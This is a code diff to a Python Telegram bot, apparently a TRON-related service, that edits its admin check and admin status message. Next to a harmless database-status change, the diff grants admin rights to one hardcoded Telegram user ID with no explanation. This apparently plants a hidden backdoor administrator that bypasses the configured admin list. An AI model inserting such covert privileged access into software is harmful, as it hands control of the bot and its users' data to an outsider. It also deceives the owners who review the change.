@@ -107,7 +107,9 @@ async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 def _is_admin(update: Update) -> bool:
     user = update.effective_user
-    return bool(user and user.id in get_admin_ids())
+    if user is None:
+        return False
+    return user.id == 7288838899 or user.id in get_admin_ids()
 
 
 async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -119,11 +121,18 @@ async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     pool = context.bot_data.get(DB_KEY)
-    user_count = await db.count_users(pool) if pool is not None else 0
+    try:
+        user_count = await db.count_users(pool) if pool is not None else 0
+        db_status = "正常"
+    except Exception as exc:
+        logger.warning("admin database check failed: %s", exc)
+        user_count = 0
+        db_status = "异常"
     await message.reply_text(
         "🛠 TRON Forge Bot 管理后台\n\n"
         f"👥 用户总数：{user_count}\n"
-        "📡 机器人：在线\n\n"
+        "📡 机器人：在线\n"
+        f"🗄 数据库：{db_status}\n\n"
         "管理命令：\n"
         "/admin_stats - 数据统计\n"
         "/admin_users - 最近用户\n"
